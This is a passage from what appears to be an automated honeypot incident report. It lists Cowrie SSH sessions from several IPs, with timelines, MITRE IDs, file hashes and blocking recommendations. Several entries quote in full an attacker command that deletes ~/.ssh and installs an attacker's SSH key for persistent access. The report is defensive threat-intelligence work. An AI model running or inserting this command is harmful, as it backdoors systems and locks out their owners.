| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 13:50:50` | `cowrie.session.connect` |
| `2026-05-22 13:50:50` | `cowrie.client.version` |
| `2026-05-22 13:50:51` | `cowrie.client.kex` |
| `2026-05-22 13:50:52` | `cowrie.login.success` |
| `2026-05-22 13:50:52` | `cowrie.session.params` |
| `2026-05-22 13:50:52` | `cowrie.command.input` |
| `2026-05-22 13:50:52` | `cowrie.command.failed` |
| `2026-05-22 13:50:53` | `cowrie.log.closed` |
| `2026-05-22 13:50:53` | `cowrie.session.params` |
| `2026-05-22 13:50:53` | `cowrie.command.input` |
| `2026-05-22 13:50:54` | `cowrie.session.file_download` |
| `2026-05-22 13:50:54` | `cowrie.log.closed` |
| `2026-05-22 13:50:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7d189174269

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-22 13:50 |
| **Last Seen** | 2026-05-22 13:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 13:50:57` | `cowrie.session.connect` |
| `2026-05-22 13:50:57` | `cowrie.client.version` |
| `2026-05-22 13:50:57` | `cowrie.client.kex` |
| `2026-05-22 13:50:59` | `cowrie.login.success` |
| `2026-05-22 13:50:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9dc0e64a33ae

| Field | Detail |
|---|---|
| **Source IP** | `95.71.127[.]158` |
| **First Seen** | 2026-05-22 13:58 |
| **Last Seen** | 2026-05-22 14:03 |
| **Session Duration** | 303s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 13:58:00` | `cowrie.session.connect` |
| `2026-05-22 13:58:01` | `cowrie.client.version` |
| `2026-05-22 13:58:01` | `cowrie.client.kex` |
| `2026-05-22 13:58:04` | `cowrie.login.success` |
| `2026-05-22 13:58:05` | `cowrie.session.params` |
| `2026-05-22 13:58:05` | `cowrie.command.input` |
| `2026-05-22 13:58:05` | `cowrie.command.failed` |
| `2026-05-22 13:58:06` | `cowrie.log.closed` |
| `2026-05-22 13:58:07` | `cowrie.session.params` |
| `2026-05-22 13:58:07` | `cowrie.command.input` |
| `2026-05-22 13:58:08` | `cowrie.session.file_download` |
| `2026-05-22 13:58:08` | `cowrie.log.closed` |
| `2026-05-22 14:03:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.71.127[.]158` to AbuseIPDB if not already reported
- [ ] Block `95.71.127[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9694299ac6b

| Field | Detail |
|---|---|
| **Source IP** | `95.71.127[.]158` |
| **First Seen** | 2026-05-22 13:58 |
| **Last Seen** | 2026-05-22 13:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 13:58:19` | `cowrie.session.connect` |
| `2026-05-22 13:58:21` | `cowrie.client.version` |
| `2026-05-22 13:58:21` | `cowrie.client.kex` |
| `2026-05-22 13:58:25` | `cowrie.login.success` |
| `2026-05-22 13:58:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.71.127[.]158` to AbuseIPDB if not already reported
- [ ] Block `95.71.127[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f88c5402d62b

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-22 14:00 |
| **Last Seen** | 2026-05-22 14:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 14:00:17` | `cowrie.session.connect` |
| `2026-05-22 14:00:17` | `cowrie.client.version` |
| `2026-05-22 14:00:17` | `cowrie.client.kex` |
| `2026-05-22 14:00:18` | `cowrie.login.success` |
| `2026-05-22 14:00:19` | `cowrie.session.params` |
| `2026-05-22 14:00:19` | `cowrie.command.input` |
| `2026-05-22 14:00:19` | `cowrie.command.failed` |
| `2026-05-22 14:00:19` | `cowrie.log.closed` |
| `2026-05-22 14:00:20` | `cowrie.session.params` |
| `2026-05-22 14:00:20` | `cowrie.command.input` |
| `2026-05-22 14:00:20` | `cowrie.session.file_download` |
| `2026-05-22 14:00:20` | `cowrie.log.closed` |
| `2026-05-22 14:00:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2aac891a6998

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-22 14:00 |
| **Last Seen** | 2026-05-22 14:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 14:00:24` | `cowrie.session.connect` |
| `2026-05-22 14:00:24` | `cowrie.client.version` |
| `2026-05-22 14:00:24` | `cowrie.client.kex` |
| `2026-05-22 14:00:25` | `cowrie.login.success` |
| `2026-05-22 14:00:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f537aeb2496

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-22 14:02 |
| **Last Seen** | 2026-05-22 14:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 14:02:06` | `cowrie.session.connect` |
| `2026-05-22 14:02:06` | `cowrie.client.version` |
| `2026-05-22 14:02:06` | `cowrie.client.kex` |
| `2026-05-22 14:02:07` | `cowrie.login.success` |
| `2026-05-22 14:02:08` | `cowrie.session.params` |
| `2026-05-22 14:02:08` | `cowrie.command.input` |
| `2026-05-22 14:02:08` | `cowrie.command.failed` |
| `2026-05-22 14:02:08` | `cowrie.log.closed` |
| `2026-05-22 14:02:09` | `cowrie.session.params` |
| `2026-05-22 14:02:09` | `cowrie.command.input` |
| `2026-05-22 14:02:09` | `cowrie.session.file_download` |
| `2026-05-22 14:02:09` | `cowrie.log.closed` |
| `2026-05-22 14:02:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-762304dcc41e

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-22 14:02 |
| **Last Seen** | 2026-05-22 14:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 14:02:13` | `cowrie.session.connect` |
| `2026-05-22 14:02:13` | `cowrie.client.version` |
| `2026-05-22 14:02:13` | `cowrie.client.kex` |
| `2026-05-22 14:02:14` | `cowrie.login.success` |
| `2026-05-22 14:02:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebd4b43602ae

| Field | Detail |
|---|---|
| **Source IP** | `47.85.18[.]171` |
| **First Seen** | 2026-05-22 14:30 |
| **Last Seen** | 2026-05-22 14:30 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 14:30:23` | `cowrie.session.connect` |
| `2026-05-22 14:30:23` | `cowrie.client.version` |
| `2026-05-22 14:30:23` | `cowrie.client.kex` |
| `2026-05-22 14:30:24` | `cowrie.login.success` |
| `2026-05-22 14:30:25` | `cowrie.session.params` |
| `2026-05-22 14:30:25` | `cowrie.command.input` |
| `2026-05-22 14:30:25` | `cowrie.command.failed` |
| `2026-05-22 14:30:25` | `cowrie.log.closed` |
| `2026-05-22 14:30:25` | `cowrie.session.params` |
| `2026-05-22 14:30:25` | `cowrie.command.input` |
| `2026-05-22 14:30:25` | `cowrie.session.file_download` |
| `2026-05-22 14:30:25` | `cowrie.log.closed` |
| `2026-05-22 14:30:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.85.18[.]171` to AbuseIPDB if not already reported
- [ ] Block `47.85.18[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e1d2c54e097

| Field | Detail |
|---|---|
| **Source IP** | `47.85.18[.]171` |
| **First Seen** | 2026-05-22 14:30 |
| **Last Seen** | 2026-05-22 14:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 14:30:28` | `cowrie.session.connect` |
| `2026-05-22 14:30:28` | `cowrie.client.version` |
| `2026-05-22 14:30:28` | `cowrie.client.kex` |
| `2026-05-22 14:30:29` | `cowrie.login.success` |
| `2026-05-22 14:30:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.85.18[.]171` to AbuseIPDB if not already reported
- [ ] Block `47.85.18[.]171` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-200b229c98cb

| Field | Detail |
|---|---|
| **Source IP** | `47.85.18[.]171` |
| **First Seen** | 2026-05-22 14:30 |
| **Last Seen** | 2026-05-22 14:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 14:30:59` | `cowrie.session.connect` |
| `2026-05-22 14:30:59` | `cowrie.client.version` |
| `2026-05-22 14:31:00` | `cowrie.client.kex` |
| `2026-05-22 14:31:00` | `cowrie.login.success` |
| `2026-05-22 14:31:01` | `cowrie.session.params` |
| `2026-05-22 14:31:01` | `cowrie.command.input` |
| `2026-05-22 14:31:01` | `cowrie.command.failed` |
| `2026-05-22 14:31:01` | `cowrie.log.closed` |
| `2026-05-22 14:31:02` | `cowrie.session.params` |
| `2026-05-22 14:31:02` | `cowrie.command.input` |
| `2026-05-22 14:31:02` | `cowrie.session.file_download` |
| `2026-05-22 14:31:02` | `cowrie.log.closed` |
| `2026-05-22 14:31:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.85.18[.]171` to AbuseIPDB if not already reported
- [ ] Block `47.85.18[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe8cad97d47d

| Field | Detail |
|---|---|
| **Source IP** | `47.85.18[.]171` |
| **First Seen** | 2026-05-22 14:31 |
| **Last Seen** | 2026-05-22 14:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 14:31:05` | `cowrie.session.connect` |
| `2026-05-22 14:31:05` | `cowrie.client.version` |
| `2026-05-22 14:31:05` | `cowrie.client.kex` |
| `2026-05-22 14:31:06` | `cowrie.login.success` |
| `2026-05-22 14:31:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.85.18[.]171` to AbuseIPDB if not already reported
- [ ] Block `47.85.18[.]171` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5026067f7f0

| Field | Detail |
|---|---|
| **Source IP** | `47.85.18[.]171` |
| **First Seen** | 2026-05-22 14:31 |
| **Last Seen** | 2026-05-22 14:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 14:31:34` | `cowrie.session.connect` |
| `2026-05-22 14:31:34` | `cowrie.client.version` |
| `2026-05-22 14:31:34` | `cowrie.client.kex` |
| `2026-05-22 14:31:35` | `cowrie.login.success` |
| `2026-05-22 14:31:35` | `cowrie.session.params` |
| `2026-05-22 14:31:35` | `cowrie.command.input` |
| `2026-05-22 14:31:35` | `cowrie.command.failed` |
| `2026-05-22 14:31:36` | `cowrie.log.closed` |
| `2026-05-22 14:31:36` | `cowrie.session.params` |
| `2026-05-22 14:31:36` | `cowrie.command.input` |
| `2026-05-22 14:31:36` | `cowrie.session.file_download` |
| `2026-05-22 14:31:36` | `cowrie.log.closed` |
| `2026-05-22 14:31:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.85.18[.]171` to AbuseIPDB if not already reported
- [ ] Block `47.85.18[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b64b754951d

| Field | Detail |
|---|---|
| **Source IP** | `47.85.18[.]171` |
| **First Seen** | 2026-05-22 14:31 |
| **Last Seen** | 2026-05-22 14:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 14:31:39` | `cowrie.session.connect` |
| `2026-05-22 14:31:39` | `cowrie.client.version` |
| `2026-05-22 14:31:39` | `cowrie.client.kex` |
| `2026-05-22 14:31:40` | `cowrie.login.success` |
| `2026-05-22 14:31:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.85.18[.]171` to AbuseIPDB if not already reported
- [ ] Block `47.85.18[.]171` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67e77b42cab7

| Field | Detail |
|---|---|
| **Source IP** | `47.85.18[.]171` |
| **First Seen** | 2026-05-22 14:32 |
| **Last Seen** | 2026-05-22 14:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 14:32:39` | `cowrie.session.connect` |
| `2026-05-22 14:32:39` | `cowrie.client.version` |
| `2026-05-22 14:32:39` | `cowrie.client.kex` |
| `2026-05-22 14:32:40` | `cowrie.login.success` |
| `2026-05-22 14:32:40` | `cowrie.session.params` |
| `2026-05-22 14:32:40` | `cowrie.command.input` |
| `2026-05-22 14:32:40` | `cowrie.command.failed` |
| `2026-05-22 14:32:40` | `cowrie.log.closed` |
| `2026-05-22 14:32:41` | `cowrie.session.params` |
| `2026-05-22 14:32:41` | `cowrie.command.input` |
| `2026-05-22 14:32:41` | `cowrie.session.file_download` |
| `2026-05-22 14:32:41` | `cowrie.log.closed` |
| `2026-05-22 14:32:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.85.18[.]171` to AbuseIPDB if not already reported
- [ ] Block `47.85.18[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f598f4c9d55

| Field | Detail |
|---|---|
| **Source IP** | `47.85.18[.]171` |
| **First Seen** | 2026-05-22 14:32 |
| **Last Seen** | 2026-05-22 14:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 14:32:44` | `cowrie.session.connect` |
| `2026-05-22 14:32:44` | `cowrie.client.version` |
| `2026-05-22 14:32:44` | `cowrie.client.kex` |
| `2026-05-22 14:32:45` | `cowrie.login.success` |
| `2026-05-22 14:32:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.85.18[.]171` to AbuseIPDB if not already reported
- [ ] Block `47.85.18[.]171` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c1481f516d0

| Field | Detail |
|---|---|
| **Source IP** | `101.36.106[.]162` |
| **First Seen** | 2026-05-22 14:33 |
| **Last Seen** | 2026-05-22 14:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 14:33:37` | `cowrie.session.connect` |
| `2026-05-22 14:33:37` | `cowrie.client.version` |
| `2026-05-22 14:33:37` | `cowrie.client.kex` |
| `2026-05-22 14:33:37` | `cowrie.login.success` |
| `2026-05-22 14:33:38` | `cowrie.session.params` |
| `2026-05-22 14:33:38` | `cowrie.command.input` |
